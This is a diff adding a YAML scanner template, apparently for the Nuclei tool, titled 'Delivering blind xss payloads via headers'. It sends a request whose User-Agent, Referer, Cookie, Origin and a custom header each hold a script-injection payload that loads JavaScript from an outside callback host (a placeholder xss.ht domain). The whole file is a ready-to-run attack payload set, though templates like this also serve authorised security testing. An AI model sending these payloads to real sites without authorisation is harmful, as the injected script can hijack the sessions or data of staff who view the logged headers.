@@ -1,0 +1,19 @@
+id: header-blind-xss
+
+info:
+  name: Delivering blind xss payloads via headers
+  author: panch0r3d
+  severity: varies
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    redirects: true
+    max-redirects: 5
+    headers:
+      User-Agent: "Mozilla UACanary12345\'&#8211;><script src=https://XXXXX.xss.ht></script>"
+      Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://XXXXX.xss.ht></script>"
+      Referer: "RFcanary12345.comRF'&#8211;><script src=https://XXXXX.xss.ht></script>"
+      Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://XXXXX.xss.ht></script>"
+      Origin: "ORCanary12345.comOR'&#8211;><script src=https://XXXXX.xss.ht></script>"
